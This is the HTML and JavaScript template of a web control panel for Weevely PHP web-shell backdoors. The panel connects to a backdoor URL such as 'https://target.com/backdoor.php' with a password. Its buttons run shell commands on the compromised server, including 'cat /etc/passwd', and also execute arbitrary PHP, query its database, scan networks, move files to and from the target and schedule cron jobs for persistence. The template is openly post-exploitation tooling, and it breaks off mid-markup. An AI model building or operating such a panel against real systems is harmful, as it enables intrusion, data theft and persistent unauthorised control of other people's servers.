<!-- Weevely Module Terminal Interface -->
<div class="container-fluid py-4">
  <div class="row">
    <div class="col-12">
      <div class="card">
        <div class="card-header">
          <div class="d-flex justify-content-between align-items-center">
            <div>
              <h5 class="mb-0">
                <i class="fas fa-terminal text-info"></i>
                Weevely Module Terminal
              </h5>
              <p class="text-sm text-muted mb-0">Execute advanced weevely modules and commands</p>
            </div>
            <div class="d-flex gap-2">
              <button class="btn btn-sm btn-outline-success" onclick="executeModuleWithDisplay(':system_info')">
                <i class="fas fa-plug"></i> Test Connection
              </button>
              <button class="btn btn-sm btn-outline-info" onclick="executeModuleWithDisplay(':system_info')">
                <i class="fas fa-info-circle"></i> Session Info
              </button>
              <button class="btn btn-sm btn-outline-secondary" onclick="clearTerminalOutput()">
                <i class="fas fa-eraser"></i> Clear
              </button>
            </div>
          </div>
        </div>

        <div class="card-body">
          <!-- Connection Settings -->
          <div class="row mb-4">
            <div class="col-md-6">
              <div class="form-group">
                <label class="form-label text-sm font-weight-bold">Weevely URL</label>
                <input type="url" id="weevely_url" class="form-control" 
                       placeholder="https://target.com/backdoor.php"
                       value="">
              </div>
            </div>
            <div class="col-md-4">
              <div class="form-group">
                <label class="form-label text-sm font-weight-bold">Password</label>
                <input type="password" id="weevely_password" class="form-control" 
                       placeholder="Enter weevely password">
              </div>
            </div>
            <div class="col-md-2">
              <div class="form-group">
                <label class="form-label text-sm font-weight-bold">Timeout (s)</label>
                <input type="number" id="command_timeout" class="form-control" 
                       value="60" min="10" max="300">
              </div>
            </div>
            <input type="hidden" id="weevely_id" value="">
          </div>

          <!-- Module Categories -->
          <div class="row mb-4">
            <div class="col-12">
              <div class="nav-wrapper position-relative">
                <ul class="nav nav-pills nav-fill p-1" role="tablist">
                  <li class="nav-item">
                    <a class="nav-link mb-0 px-0 py-1 active" data-bs-toggle="tab" href="#file-ops" role="tab">
                      <i class="fas fa-folder"></i> File Operations
                    </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link mb-0 px-0 py-1" data-bs-toggle="tab" href="#system-info" role="tab">
                      <i class="fas fa-server"></i> System Info
                    </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link mb-0 px-0 py-1" data-bs-toggle="tab" href="#shell-ops" role="tab">
                      <i class="fas fa-terminal"></i> Shell Operations
                    </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link mb-0 px-0 py-1" data-bs-toggle="tab" href="#sql-console" role="tab">
                      <i class="fas fa-database"></i> SQL Console
                    </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link mb-0 px-0 py-1" data-bs-toggle="tab" href="#network-ops" role="tab">
                      <i class="fas fa-network-wired"></i> Network
                    </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link mb-0 px-0 py-1" data-bs-toggle="tab" href="#custom-cmd" role="tab">
                      <i class="fas fa-code"></i> Custom Command
                    </a>
                  </li>
                  <li class="nav-item">
                    <a class="nav-link mb-0 px-0 py-1" data-bs-toggle="tab" href="#cron-jobs" role="tab" id="cron-jobs-tab">
                      <i class="fas fa-clock"></i> Cron Jobs
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>

          <!-- Module Content -->
          <div class="tab-content">
            <!-- File Operations Tab -->
            <div class="tab-pane fade show active" id="file-ops" role="tabpanel">
              <div class="row">
                <div class="col-md-6">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6>File Management</h6>
                    </div>
                    <div class="card-body">
                      <div class="btn-group-vertical w-100" role="group">
                        <button class="btn btn-outline-primary mb-2" onclick="executeModuleWithDisplay(':file_ls /')">
                          <i class="fas fa-list"></i> List Root Directory
                        </button>
                        <button class="btn btn-outline-primary mb-2" onclick="showFileSearchModal()">
                          <i class="fas fa-search"></i> Find Files
                        </button>
                        <button class="btn btn-outline-primary mb-2" onclick="showFileReadModal()">
                          <i class="fas fa-file-alt"></i> Read File
                        </button>
                        <button class="btn btn-outline-primary mb-2" onclick="showFileOperationsModal()">
                          <i class="fas fa-tools"></i> File Operations
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6>Directory Navigation</h6>
                    </div>
                    <div class="card-body">
                      <div class="form-group">
                        <label class="form-label text-sm">Current Path</label>
                        <div class="input-group">
                          <input type="text" id="current_path" class="form-control" value="/" placeholder="/path/to/directory">
                          <button class="btn btn-outline-secondary" onclick="listDirectory()">
                            <i class="fas fa-folder-open"></i> List
                          </button>
                        </div>
                      </div>
                      <div class="d-flex gap-2 flex-wrap">
                        <button class="btn btn-sm btn-outline-info" onclick="changeDirectory('/var/www')">
                          <i class="fas fa-globe"></i> Web Root
                        </button>
                        <button class="btn btn-sm btn-outline-info" onclick="changeDirectory('/tmp')">
                          <i class="fas fa-folder"></i> /tmp
                        </button>
                        <button class="btn btn-sm btn-outline-info" onclick="changeDirectory('/etc')">
                          <i class="fas fa-cog"></i> /etc
                        </button>
                        <button class="btn btn-sm btn-outline-info" onclick="changeDirectory('/home')">
                          <i class="fas fa-home"></i> /home
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <!-- System Info Tab -->
            <div class="tab-pane fade" id="system-info" role="tabpanel">
              <div class="row">
                <div class="col-md-6">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6>System Information</h6>
                    </div>
                    <div class="card-body">
                      <div class="btn-group-vertical w-100" role="group">
                        <button class="btn btn-outline-success mb-2" onclick="executeModuleWithDisplay(':system_info')">
                          <i class="fas fa-info-circle"></i> System Info
                        </button>
                        <button class="btn btn-outline-success mb-2" onclick="executeModuleWithDisplay(':system_extensions')">
                          <i class="fas fa-puzzle-piece"></i> PHP Extensions
                        </button>
                        <button class="btn btn-outline-success mb-2" onclick="executeModuleWithDisplay(`:shell_sh 'ps -aux'`)">
                          <i class="fas fa-tasks"></i> Running Processes
                        </button>
                        <button class="btn btn-outline-success mb-2" onclick="executeModuleWithDisplay(`:shell_sh 'ifconfig'`)">
                          <i class="fas fa-network-wired"></i> Network Interfaces
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6>Security Audit</h6>
                    </div>
                    <div class="card-body">
                      <div class="btn-group-vertical w-100" role="group">
                        <button class="btn btn-outline-warning mb-2" onclick="executeModuleWithDisplay(':audit_phpconf')">
                          <i class="fas fa-shield-alt"></i> PHP Configuration
                        </button>
                        <button class="btn btn-outline-warning mb-2" onclick="executeModuleWithDisplay(':audit_filesystem')">
                          <i class="fas fa-hdd"></i> Filesystem Audit
                        </button>
                        <button class="btn btn-outline-warning mb-2" onclick="executeModuleWithDisplay(':audit_suidsgid /')">
                          <i class="fas fa-user-shield"></i> SUID/SGID Files
                        </button>
                        <button class="btn btn-outline-warning mb-2" onclick="executeModuleWithDisplay(':audit_etcpasswd')">
                          <i class="fas fa-users"></i> /etc/passwd Analysis
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <!-- Shell Operations Tab -->
            <div class="tab-pane fade" id="shell-ops" role="tabpanel">
              <div class="row">
                <div class="col-12">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6>Execute Shell Commands</h6>
                    </div>
                    <div class="card-body">
                      <div class="form-group">
                        <label class="form-label text-sm">Shell Command</label>
                        <div class="input-group">
                          <input type="text" id="shell_command" class="form-control" 
                                 placeholder="ls -la, whoami, ps aux, etc..."
                                 onkeypress="if(event.key === 'Enter') executeShellCommand()">
                          <button class="btn btn成功" onclick="executeShellCommand()">
                            <i class="fas fa-play"></i> Execute
                          </button>
                        </div>
                      </div>
                      
                      <div class="row">
                        <div class="col-md-6">
                          <div class="d-flex gap-2 flex-wrap mb-3">
                            <button class="btn btn-sm btn-outline-primary" onclick="setShellCommand('whoami')">whoami</button>
                            <button class="btn btn-sm btn-outline-primary" onclick="setShellCommand('id')">id</button>
                            <button class="btn btn-sm btn-outline-primary" onclick="setShellCommand('pwd')">pwd</button>
                            <button class="btn btn-sm btn-outline-primary" onclick="setShellCommand('uname -a')">uname -a</button>
                          </div>
                        </div>
                        <div class="col-md-6">
                          <div class="d-flex gap-2 flex-wrap mb-3">
                            <button class="btn btn-sm btn-outline-secondary" onclick="setShellCommand('ps aux')">ps aux</button>
                            <button class="btn btn-sm btn-outline-secondary" onclick="setShellCommand('netstat -tulpn')">netstat</button>
                            <button class="btn btn-sm btn-outline-secondary" onclick="setShellCommand('df -h')">df -h</button>
                            <button class="btn btn-sm btn-outline-secondary" onclick="setShellCommand('cat /etc/passwd')">passwd</button>
                          </div>
                        </div>
                      </div>

                      <!-- PHP Code Execution -->
                      <div class="form-group">
                        <label class="form-label text-sm">PHP Code</label>
                        <div class="input-group">
                          <textarea id="php_code" class="form-control" rows="3" 
                                    placeholder="echo phpinfo(); // PHP code to execute"></textarea>
                          <button class="btn btn-warning" onclick="executeModuleWithDisplay(':shell_php ' + document.getElementById('php_code').value)">
                            <i class="fab fa-php"></i> Execute PHP
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <!-- SQL Console Tab -->
            <div class="tab-pane fade" id="sql-console" role="tabpanel">
              <div class="row">
                <div class="col-12">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6><i class="fas fa-database text-primary"></i> SQL Console</h6>
                      <p class="text-sm text-muted mb-0">Execute SQL queries via Weevely <code>:sql_console</code> module</p>
                    </div>
                    <div class="card-body">
                      <!-- SQL Connection Parameters -->
                      <div class="row">
                        <div class="col-md-6">
                          <div class="form-group mb-3">
                            <label class="form-label text-sm font-weight-bold">Username *</label>
                            <input type="text" id="sql_username_tab" class="form-control" placeholder="wp_user" value="wp_user">
                          </div>
                        </div>
                        <div class="col-md-6">
                          <div class="form-group mb-3">
                            <label class="form-label text-sm font-weight-bold">Password *</label>
                            <input type="password" id="sql_password_tab" class="form-control" placeholder="password" value="password">
                          </div>
                        </div
                      </div>

                      <div class="row">
                        <div class="col-md-4">
                          <div class="form-group mb-3">
                            <label class="form-label text-sm font-weight-bold">Host *</label>
                            <input type="text" id="sql_host_tab" class="form-control" placeholder="localhost" value="localhost">
                          </div>
                        </div>
                        <div class="col-md-4">
                          <div class="form-group mb-3">
                            <label class="form-label text-sm font-weight-bold">PORT *</label>
                            <input type="text" id="sql_port_tab" class="form-control" placeholder="3306" value="3306">
                          </div>
                        </div>
                      </div>

                      <div class="row">
                        <div class="col-md-4">
                          <div class="form-group mb-3">
                            <label class="form-label text-sm font-weight-bold">DBMS *</label>
                            <select id="sql_dbms_tab" class="form-control">
                              <option value="mysql" selected>MySQL</option>
                              <option value="pgsql">PostgreSQL</option>
                            </select>
                          </div>
                        </div>
                        <div class="col-md-4">
                          <div class="form-group mb-3">
                            <label class="form-label text-sm font-weight-bold">Database *</label>
                            <input type="text" id="sql_database_tab" class="form-control" placeholder="wordpress" value="wordpress">
                          </div>
                        </div>
                      </div>
                      
                      <!-- SQL Query -->
                      <div class="form-group mb-3">
                        <label class="form-label text-sm font-weight-bold">SQL Query *</label>
                        <textarea id="sql_query_tab" class="form-control" rows="4" placeholder="SHOW TABLES;">SHOW TABLES;</textarea>
                        <small class="text-muted">Enter your SQL query here</small>
                      </div>
                      
                      <!-- Quick Query Buttons -->
                      <div class="mb-3">
                        <label class="form-label text-sm font-weight-bold">Quick Queries:</label>
                        <div class="d-flex gap-2 flex-wrap">
                          <button class="btn btn-sm btn-outline-secondary" onclick="setSqlQueryTab('SHOW TABLES;')">SHOW TABLES</button>
                          <button class="btn btn-sm btn-outline-secondary" onclick="setSqlQueryTab('SELECT NOW();')">SELECT NOW()</button>
                          <button class="btn btn-sm btn-outline-secondary" onclick="setSqlQueryTab('SHOW DATABASES;')">SHOW DATABASES</button>
                          <button class="btn btn-sm btn-outline-secondary" onclick="setSqlQueryTab('SELECT USER();')">SELECT USER()</button>
                          <button class="btn btn-sm btn-outline-secondary" onclick="setSqlQueryTab('SELECT VERSION();')">VERSION</button>
                        </div>
                      </div>
                      
                      <!-- Execute Button -->
                      <div class="text-center">
                        <button class="btn btn-primary btn-lg" onclick="executeSqlConsoleTab()">
                          <i class="fas fa-play"></i> Run SQL Query
                        </button>
                        <button class="btn btn-outline-secondary" onclick="clearSqlForm()">
                          <i class="fas fa-eraser"></i> Clear Form
                        </button>
                      </div>
                    </div>  
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            <script>
            // SQL Console Tab Functions
            function setSqlQueryTab(query) {
              document.getElementById('sql_query_tab').value = query;
            }
            
            function clearSqlForm() {
              document.getElementById('sql_username_tab').value = '';
              document.getElementById('sql_password_tab').value = '';
              document.getElementById('sql_host_tab').value = 'localhost';
              document.getElementById('sql_port_tab').value = '3306';
              document.getElementById('sql_dbms_tab').value = 'mysql';
              document.getElementById('sql_database_tab').value = '';
              document.getElementById('sql_query_tab').value = '';
            }
            
            function executeSqlConsoleTab() {
              const username = document.getElementById('sql_username_tab').value.trim();
              const password = document.getElementById('sql_password_tab').value.trim();
              const host = document.getElementById('sql_host_tab').value.trim();
              const port = document.getElementById('sql_port_tab').value.trim();
              const dbms = document.getElementById('sql_dbms_tab').value.trim();
              const database = document.getElementById('sql_database_tab').value.trim();
              const query = document.getElementById('sql_query_tab').value.trim();
              
              // Validation
              if (!username || !password || !host || !dbms || !query) {
                alert('Please fill in all required fields (marked with *)');
                return;
              }
              
              // Escape query for shell
              const escapedQuery = query.replace(/'/g, "'\"'\"'");
              const command = `:sql_console -user ${username} -passwd ${password} -host ${host} -dbms ${dbms} -database ${database} -query '${escapedQuery}'`;
              
              console.log('SQL Console Command:', command);
              appendToTerminal(`Executing SQL: ${query.substring(0, 50)}${query.length > 50 ? '...' : ''}`, 'command');
              
              // Execute command
              if (typeof executeModuleWithDisplay === 'function') {
                executeModuleWithDisplay(command);
              } else if (typeof executeWeevelyModule === 'function') {
                executeWeevelyModule(command);
              } else {
                alert('Execution function not available. Please ensure weevely connection is loaded.');
                appendToTerminal('Error: No execution function available', 'error');
              }
            }
            </script>

            <!-- Network Operations Tab -->
            <div class="tab-pane fade" id="network-ops" role="tabpanel">
              <div class="row">
                <div class="col-md-6">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6>Network Tools</h6>
                    </div>
                    <div class="card-body">
                      <div class="form-group">
                        <label class="form-label text-sm">Target Host/IP</label>
                        <div class="input-group mb-3">
                          <input type="text" id="scan_target" class="form-control" placeholder="192.168.1.1 10-8080 (IP Port-Check_Open)">
                          <button class="btn btn-primary" onclick="executeModuleWithDisplay(':net_scan ' + document.getElementById('scan_target').value)">
                            <i class="fas fa-search"></i> Scan
                          </button>
                        </div>
                      </div>
                      
                      <div class="form-group">
                        <label class="form-label text-sm">URL to Fetch</label>
                        <div class="input-group mb-3">
                          <input type="url" id="curl_url" class="form-control" placeholder="https://example.com">
                          <button class="btn btn-info" onclick="executeModuleWithDisplay(':net_curl ' + document.getElementById('curl_url').value)">
                            <i class="fas fa-download"></i> Fetch
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6>File Transfer</h6>
                    </div>
                    <div class="card-body">
                      <div class="form-group">
                        <label class="form-label text-sm">Download from URL</label>
                        <div class="input-group mb-3">
                          <input type="url" id="download_url" class="form-control" placeholder="https://example.com/file.txt">
                          <input type="text" id="save_path" class="form-control" placeholder="/tmp/file.txt">
                          <button class="btn btn-success" onclick="executeWebDownload()">
                            <i class="fas fa-cloud-download-alt"></i> Download
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <!-- Cron Jobs Tab -->
            <div class="tab-pane fade" id="cron-jobs" role="tabpanel">
              <div class="row">
                <div class="col-md-6">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6>Create Cron Job</h6>
                    </div>
                    <div class="card-body">
                      <form id="createCronJobFormTerminal">
                        <div class="form-group mb-3">
                          <label class="form-label text-sm">Job Name *</label>
                          <input type="text" id="cron_job_name_terminal" class="form-control" placeholder="e.g., Daily Backup" required>
                        </div>
                        
                        <div class="form-group mb-3">
                          <label class="form-label text-sm">Description</label>
                          <textarea id="cron_job_description_terminal" class="form-control" rows="2" placeholder="Job description..."></textarea>
                        </div>
                        
                        <div class="form-group mb-3">
                          <label class="form-label text-sm">Cron Expression *</label>
                          <input type="text" id="cron_expression_terminal" class="form-control" placeholder="*/5 * * * * (every 5 minutes)" required>
                          <small class="form-text text-muted">
                            Format: Minute Hour Day Month DayOfWeek<br>
                            Examples: */5 * * * * (every 5 min), 0 */6 * * * (every 6 hours)
                          </small>
                        </div>
                        
                        <div class="form-group mb-3">
                          <label class="form-label text-sm">Job Type *</label>
                          <select id="cron_job_type_terminal" class="form-control" onchange="updateJobTypeFieldsTerminal()" required>
                            <option value="">Select Job Type</option>
                            <option value="file_operation">File Operation</option>
                            <option value="command">Command Execution</option>
                            <option value="download">File Download</option>
                            <option value="upload">File Upload</option>
                          </select>
                        </div>
                        
                        <!-- Dynamic fields based on job type -->
                        <div id="job_type_fields_terminal">
                          <!-- Fields will be populated by JavaScript -->
                        </div>
                        
                        <button type="submit" class="btn btn-primary w-100">
                          <i class="fas fa-save"></i> Create Cron Job
                        </button>
                      </form>
                    </div>
                  </div>
                </div>
                
                <div class="col-md-6">
                  <div class="card border">
                    <div class="card-header pb-0 d-flex justify-content-between align-items-center">
                      <h6>Manage Cron Jobs</h6>
                      <button class="btn btn-sm btn-outline-primary" onclick="refreshCronJobsTerminal()">
                        <i class="fas fa-sync"></i> Refresh
                      </button>
                    </div>
                    <div class="card-body">
                      <div id="cronJobsListTerminal">
                        <!-- Cron jobs will be loaded here -->
                        <div class="text-center text-muted">
                          <i class="fas fa-clock fa-2x mb-2"></i>
                          <p>No cron jobs found</p>
                          <small>Create a cron job to get started</small>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <!-- Custom Command Tab -->
            <div class="tab-pane fade" id="custom-cmd" role="tabpanel">
              <div class="row">
                <div class="col-12">
                  <div class="card border">
                    <div class="card-header pb-0">
                      <h6>Custom Weevely Command</h6>
                    </div>
                    <div class="card-body">
                      <div class="form-group">
                        <label class="form-label text-sm">Weevely Command</label>
                        <div class="input-group">
                          <span class="input-group-text">:</span>
                          <input type="text" id="custom_command" class="form-control" 
                                 placeholder="file_ls /var/www or system_info"
                                 onkeypress="if(event.key === 'Enter') executeCustomCommand()">
                          <button class="btn btn-primary" onclick="executeModuleWithDisplay(':' + document.getElementById('custom_command').value)">
                            <i class="fas fa-play"></i> Execute
                          </button>
                        </div>
                        <small class="text-muted">Enter weevely module command without the leading colon (:)</small>
                      </div>

                      <div class="row">
                        <div class="col-md-6">
                          <h6 class="text-sm font-weight-bold mb-2">Common Commands:</h6>
                          <div class="d-flex gap-2 flex-wrap">
                            <button class="btn btn-sm btn-outline-dark" onclick="executeModuleWithDisplay(':system_info')">system_info</button>
                            <button class="btn btn-sm btn-outline-dark" onclick="executeModuleWithDisplay(':file_ls /')">file_ls /</button>
                            <button class="btn btn-sm btn-outline-dark" onclick="executeModuleWithDisplay(':procs_list')">procs_list</button>
                            <button class="btn btn-sm btn-outline-dark" onclick="executeModuleWithDisplay(':audit_phpconf')">audit_phpconf</button>
                          </div>
                        </div>
                        <div class="col-md-6">
                          <h6 class="text-sm font-weight-bold mb-2">Batch Commands:</h6>
                          <div class="d-flex gap-2">
                            <button class="btn btn-sm btn-success" onclick="executeBatchCommands()">
                              <i class="fas fa-list"></i> Execute Batch
                            </button>
                            <button class="btn btn-sm btn-outline-secondary" onclick="showBatchModal()">
                              <i class="fas fa-edit"></i> Edit Batch
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          <!-- Terminal Output -->
          <div class="row mt-4">
            <div class="col-12">
              <div class="card bg-dark">
                <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
                  <h6 class="mb-0">
                    <i class="fas fa-terminal text-success"></i>
                    Terminal Output
                  </h6>
                  <div>
                    <span id="execution_status" class="badge bg-secondary">Ready</span>
                    <button class="btn btn-sm btn-outline-light ms-2" onclick="copyTerminalOutput()">
                      <i class="fas fa-copy"></i> Copy
                    </button>
                    <button class="btn btn-sm btn-outline-light ms-2" onclick="toggleDataDisplay()">
                      <i class="fas fa-chart-bar"></i> Toggle Data View
                    </button>
                  </div>
                </div>
                <div class="card-body p-3" style="min-height: 300px;">
                  <div id="terminal_output" class="text-light font-monospace" style="white-space: pre-wrap; overflow-y: auto; max-height: 400px;">
                    Welcome to Weevely Module Terminal
                    Enter connection details above and select modules to execute...
                  </div>
                  <div class="mt-3 d-flex gap-2">
                    <button class="btn btn-outline-info btn-sm" onclick="showDownloadedFilesModal()">
                      <i class="fas fa-folder-open"></i> Downloaded Files
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- Loading Overlay -->
<div id="loading_overlay" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(0,0,0,0.7); z-index: 9999;">
  <div class="d-flex justify-content-center align-items-center h-100">
    <div class="text-center text-white">
      <div class="spinner-border text-light mb-3" role="status">
        <span class="visually-hidden">Loading...</span>
      </div>
      <h5 id="loading_message">Executing command...</h5>
    </div>
  </div>
</div>

<!-- Downloaded Files Modal -->
<div class="modal fade" id="downloadedFilesModal" tabindex="-1" aria-labelledby="downloadedFilesLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="downloadedFilesLabel"><i class="fas fa-download"></i> Downloaded Files</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <div class="table-responsive">
          <table class="table table-hover">
            <thead>
              <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Created</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody id="downloadedFilesTable">
              <tr><td colspan="4" class="text-center text-muted">Loading...</td></tr>
            </tbody>
          </table>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
  
</div>

<script>
function showDownloadedFilesModal() {
  const modal = new bootstrap.Modal(document.getElementById('downloadedFilesModal'));
  modal.show();
  loadDownloadedFiles();
}

function loadDownloadedFiles() {
  const tbody = document.getElementById('downloadedFilesTable');
  tbody.innerHTML = '<tr><td colspan="4" class="text-center text-muted">Loading...</td></tr>';
  fetch('/api/dataserver/list-file?folder=download')
    .then(r => r.json())
    .then(data => {
      const files = data.files || data.file_list || [];
      if (!Array.isArray(files) || files.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" class="text-center text-muted">No files</td></tr>';
        return;
      }
      const rows = files.map(f => {
        const name = f.name || f.file_name || '';
        const size = f.size_readable || f.size || '';
        const created = f.created_at || f.file_created_at || '';
        const href = `/api/dataserver/download-download-file?filename=${encodeURIComponent(name)}&folder=download`;
        return `
          <tr>
            <td><code>${name}</code></td>
            <td>${size}</td>
            <td><small class="text-muted">${created}</small></td>
            <td>
              <a class="btn btn-sm btn-outline-primary" href="${href}"><i class="fas fa-download"></i></a>
            </td>
          </tr>`;
      }).join('');
      tbody.innerHTML = rows;
    })
    .catch(err => {
      console.error('Error loading downloaded files:', err);
      tbody.innerHTML = '<tr><td colspan="4" class="text-center text-danger">Error loading files</td></tr>';
    });
}
</script>

<!-- Cron Jobs JavaScript Functions -->
<script>
let currentWeevelyConnectionId = null;
// Initialize cron jobs form
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('createCronJobFormTerminal');
    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            createCronJobTerminal();
        });
    }
});

function updateJobTypeFieldsTerminal() {
    const jobType = document.getElementById('cron_job_type_terminal').value;
    const fieldsContainer = document.getElementById('job_type_fields_terminal');
    
    let fieldsHTML = '';
    
    switch(jobType) {
        case 'file_operation':
            fieldsHTML = `
                <div class="form-group mb-3">
                    <label class="form-label text-sm">Operation *</label>
                    <select id="file_operation_terminal" class="form-control" required>
                        <option value="">Select Operation</option>
                        <option value="copy">Copy File</option>
                        <option value="move">Move File</option>
                        <option value="delete">Delete File</option>
                        <option value="mkdir">Create Directory</option>
                    </select>
                </div>
                <div class="form-group mb-3">
                    <label class="form-label text-sm">Source Path *</label>
                    <input type="text" id="file_source_terminal" class="form-control" placeholder="/path/to/source" required>
                </div>
                <div class="form-group mb-3" id="file_dest_group_terminal" style="display: none;">
                    <label class="form-label text-sm">Destination Path *</label>
                    <input type="text" id="file_destination_terminal" class="form-control" placeholder="/path/to/destination">
                </div>
            `;
            break;
            
        case 'command':
            fieldsHTML = `
                <div class="form-group mb-3">
                    <label class="form-label text-sm">Command *</label>
                    <input type="text" id="command_text_terminal" class="form-control" placeholder=":system_info" required>
                    <small class="form-text text-muted">Weevely command starting with ':'</small>
                </div>
            `;
            break;
            
        case 'download':
            fieldsHTML = `
                <div class="form-group mb-3">
                    <label class="form-label text-sm">Target Path *</label>
                    <input type="text" id="download_path_terminal" class="form-control" placeholder="/path/to/file" required>
                    <small class="form-text text-muted">File path on target server to download</small>
                </div>
            `;
            break;
            
        case 'upload':
            fieldsHTML = `
                <div class="form-group mb-3">
                    <label class="form-label text-sm">Source Path *</label>
                    <input type="text" id="upload_source_terminal" class="form-control" placeholder="/local/path" required>
                    <small class="form-text text-muted">Local file path to upload</small>
                </div>
                <div class="form-group mb-3">
                    <label class="form-label text-sm">Target Path *</label>
                    <input type="text" id="upload_target_terminal" class="form-control" placeholder="/remote/path" required>
                    <small class="form-text text-muted">Remote file path on target server</small>
                </div>
            `;
            break;
    }
    
    fieldsContainer.innerHTML = fieldsHTML;
    
    // Add event listener for file operation destination field
    if (jobType === 'file_operation') {
        setTimeout(() => {
            const operationSelect = document.getElementById('file_operation_terminal');
            const destGroup = document.getElementById('file_dest_group_terminal');
            if (operationSelect && destGroup) {
                operationSelect.addEventListener('change', function() {
                    if (['copy', 'move'].includes(this.value)) {
                        destGroup.style.display = 'block';
                        document.getElementById('file_destination_terminal').required = true;
                    } else {
                        destGroup.style.display = 'none';
                        document.getElementById('file_destination_terminal').required = false;
                    }
                });
            }
        }, 100);
    }
}

function refreshCronJobsTerminal() {
    const container = document.getElementById('cronJobsListTerminal');
    container.innerHTML = '<div class="text-center text-muted"><i class="fas fa-spinner fa-spin"></i> Loading cron jobs...</div>';
    
    // Get current weevely connection ID from terminal
    const weevelyUrl = document.getElementById('weevely_url').value;
    const weevelyPassword = document.getElementById('weevely_password').value;
    const weevelyId = document.getElementById('weevely_id').value;
    
    if (!weevelyUrl || !weevelyPassword) {
        container.innerHTML = '<div class="text-center text-warning">Please configure weevely connection first</div>';
        return;
    }
    
    // For now, show all cron jobs (in future, filter by connection)
    fetch('/api/weevely/cron-jobs')
        .then(response => response.json())
        .then(data => {
            if (data.success && data.cron_jobs.length > 0) {
                displayCronJobsTerminal(data.cron_jobs);
            } else {
                container.innerHTML = '<div class="text-center text-muted">No cron jobs found</div>';
            }
        })
        .catch(error => {
            console.error('Error loading cron jobs:', error);
            container.innerHTML = '<div class="text-center text-danger">Error loading cron jobs</div>';
        });
}

function displayCronJobsTerminal(cronJobs) {
    const container = document.getElementById('cronJobsListTerminal');
    
    let html = '';
    cronJobs.forEach(job => {
        // Status styling
        const statusClass = job.is_active ? 'success' : 'secondary';
        const statusText = job.is_active ? 'Active' : 'Inactive';
        const statusIcon = job.is_active ? 'fa-toggle-on' : 'fa-toggle-off';
        
        // Next run info
        const nextRun = job.next_run ? new Date(job.next_run).toLocaleString() : 'Unknown';
        const lastRun = job.last_run ? new Date(job.last_run).toLocaleString() : 'Never';
        
        html += `
            <div class="card mb-2 border-${job.is_active ? 'success' : 'secondary'} cron-job-card ${job.is_active ? 'status-active' : 'status-inactive'}">
                <div class="card-body p-3">
                    <div class="d-flex justify-content-between align-items-start">
                        <div class="flex-grow-1">
                            <div class="d-flex align-items-center gap-2 mb-3">
                                <h6 class="mb-0 text-sm fw-bold">${job.name}</h6>
                                <span class="badge bg-${statusClass} fs-6 cron-status-badge">
                                    <i class="fas ${statusIcon} me-1"></i>${statusText}
                                </span>
                            </div>
                            
                            <p class="mb-3 text-muted small">${job.description || 'No description'}</p>
                            
                            <div class="row text-muted small mb-3">
                                <div class="col-md-6">
                                    <div class="cron-info-row mb-2">
                                        <div class="cron-info-label">Schedule</div>
                                        <div class="cron-info-value">
                                            <i class="fas fa-clock text-primary me-2"></i>
                                            <code class="cron-schedule-code">${job.cron_expression}</code>
                                        </div>
                                    </div>
                                    <div class="cron-info-row mb-2">
                                        <div class="cron-info-label">Job Type</div>
                                        <div class="cron-info-value">
                                            <i class="fas fa-tag text-info me-2"></i>
                                            <span class="text-capitalize">${job.job_type.replace('_', ' ')}</span>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="cron-info-row mb-2">
                                        <div class="cron-info-label">Next Run</div>
                                        <div class="cron-info-value">
                                            <i class="fas fa-calendar-alt text-success me-2"></i>
                                            <span>${nextRun}</span>
                                        </div>
                                    </div>
                                    <div class="cron-info-row mb-2">
                                        <div class="cron-info-label">Last Run</div>
                                        <div class="cron-info-value">
                                            <i class="fas fa-history text-warning me-2"></i>
                                            <span>${lastRun}</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="cron-action-buttons">
                            <button class="btn btn-sm btn-outline-success" onclick="executeCronJobNowTerminal(${job.id})" title="Execute Now">
                                <i class="fas fa-play me-1"></i>Run Now
                            </button>
                            
